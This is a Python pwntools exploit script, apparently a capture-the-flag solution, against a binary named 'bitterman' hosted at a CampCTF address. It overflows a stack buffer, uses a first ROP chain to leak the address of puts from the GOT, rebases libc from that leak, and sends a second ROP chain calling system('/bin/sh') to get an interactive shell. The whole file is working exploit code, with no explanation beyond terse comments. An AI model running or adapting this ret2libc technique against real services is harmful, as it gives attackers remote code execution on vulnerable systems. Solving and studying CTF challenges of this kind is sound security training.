from pwn import *
import struct
context(arch='amd64')

r = process('./bitterman')
# r = remote('challs.campctf.ccc.ac','10103')

elf = ELF('./bitterman')
libc = ELF('libc.so.6')
# libc = ELF('libc-2.19.so')
rop = ROP(elf)

"""
gdb.attach(r, '''
bp 0x400704
''')
"""

print r.recv()

# raw_input()
### Stack address leaked when filling the name buffer to its max (64 bytes)
# r.sendline('a' * 64)
# leak = r.recv().split()[1][64:72]
r.sendline('')
r.recv()

r.sendline('1024')

####
# Leak read from GOT
# Call main to rethrow exploit with magic libc gadget
###
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

log.info("ROP 1 - read( puts() from GOT); call main")
print rop.dump()

"""
RIP  0x4007e1 (main+245) <-- ret
[-------------------------------CODE-------------------------------]
=> 0x4007e1 <main+245>    ret    
[------------------------------STACK-------------------------------]
00:0000| rsp  0x7fffffffdaf8 <-- 'naaboaabpaabqaa...'
"""

shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
# shellcode = 'B' * (cyclic_find('oaab') - 4)
shellcode += str(rop)

r.clean()
r.sendline(shellcode)

r.recvuntil('Thanks!')

log.info("Sending stage two")

# Be sure to add the zeros that we miss due to string read
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')
log.info("Leak: {}".format(repr(leaked_puts)))
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Reset libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
log.info('Libc address: {}'.format(hex(libc.address)))

# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

log.info("ROP 2:")
print rop2.dump()

r.clean()
raw_input('name')
r.sendline('')
raw_input('length')
r.sendline('1024')

shellcode = 'B' * (cyclic_find(unhex('6261616f')[::-1]) - 4)
shellcode += str(rop2)

raw_input('send?')
r.sendline(shellcode)

r.interactive()
